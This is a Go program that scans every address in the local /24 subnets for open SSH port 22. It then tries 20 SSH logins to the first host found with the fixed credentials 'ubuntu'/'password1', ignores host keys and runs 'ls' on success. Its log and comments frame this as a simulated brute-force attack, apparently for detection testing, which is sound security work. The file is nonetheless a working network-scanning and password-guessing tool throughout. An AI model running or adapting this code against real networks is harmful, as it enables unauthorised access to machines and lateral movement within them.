package main

import (
	"golang.org/x/crypto/ssh"
	"net"
	"strconv"
	"strings"
	"time"
)

func main() {
	// get ips on this system
	Log := setupLogger("lw-scan-brute.log")
	ips, ipErr := getIps()
	if ipErr != nil {
		panic(ipErr)
	}

	// get ip ranges from ips found
	expIps := expandIps(ips)

	// check each ip in the slice for open port
	Log.Println("Scanning IPs in local subnet for open ssh port (22)...")
	var ipsPortOpen []string
	for _, ip := range expIps {
		//fmt.Println("Scanning: "+ip)
		open := scanPort("tcp", ip, 22)
		//fmt.Println("Port 22:", open)
		if open {
			//fmt.Println(ip+" has port 22 open")
			ipsPortOpen = append(ipsPortOpen, ip)
		}
	}
	Log.Println("Found " + strconv.Itoa(len(ipsPortOpen)) + " hosts with port 22 open")
	Log.Println(ipsPortOpen)

	// attempt ssh login
	for i := 0; i < 1; i++ {
		Log.Println("Will choose one from this list to simulate brute force...")
		time.Sleep(1 * time.Second)
		Log.Println("Attempting to ssh to: " + ipsPortOpen[i])
		// do this 20 times
		for j := 0; j < 20; j++ {
			Log.Println("Attempt " + strconv.Itoa(j+1))
			client, session, err := connectToHost("ubuntu", "password1", ipsPortOpen[i])
			if err != nil {
				//panic(err)
				Log.Println(" ", err)
				continue
			}
			out, err := session.CombinedOutput("ls")
			if err != nil {
				//panic(err)
				Log.Println(" ", err)
				continue
			}
			Log.Println(string(out))
			_ = client.Close()

			//sleep for 1 second between attempts
			time.Sleep(1 * time.Second)
		}
	}
}

func getIps() ([]string, error) {
	var ips []string

	ifaces, err := net.Interfaces()
	if err != nil {
		return ips, err
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 {
			continue // interface down
		}
		if iface.Flags&net.FlagLoopback != 0 {
			continue // loopback interface
		}
		addrs, err := iface.Addrs()
		if err != nil {
			return ips, err
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			ip = ip.To4()
			if ip == nil {
				continue // not an Ipv4 addr
			}
			ips = append(ips, ip.String())
		}
	}
	return ips, nil
}

func appendIfMissing(slice []string, string string) []string {
	for _, element := range slice {
		if element == string {
			return slice
		}
	}
	return append(slice, string)
}

func expandIps(ips []string) []string {
	var expIps []string

	for _, ip := range ips {
		ipSlice := strings.Split(ip, ".")
		for i := 1; i <= 255; i++ {
			newIp := ipSlice[0] + "." + ipSlice[1] + "." + ipSlice[2] + "." + strconv.Itoa(i)
			expIps = appendIfMissing(expIps, newIp)
		}
	}
	return expIps
}

func scanPort(protocol, hostname string, port int) bool {
	address := hostname + ":" + strconv.Itoa(port)
	conn, err := net.DialTimeout(protocol, address, 100*time.Millisecond)

	if err != nil {
		return false
	}
	_ = conn.Close()
	return true
}

func connectToHost(user string, pass string, host string) (*ssh.Client, *ssh.Session, error) {
	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(pass)},
	}
	sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()

	client, err := ssh.Dial("tcp", host+":22", sshConfig)
	if err != nil {
		return nil, nil, err
	}

	session, err := client.NewSession()
	if err != nil {
		_ = client.Close()
		return nil, nil, err
	}

	return client, session, nil
}
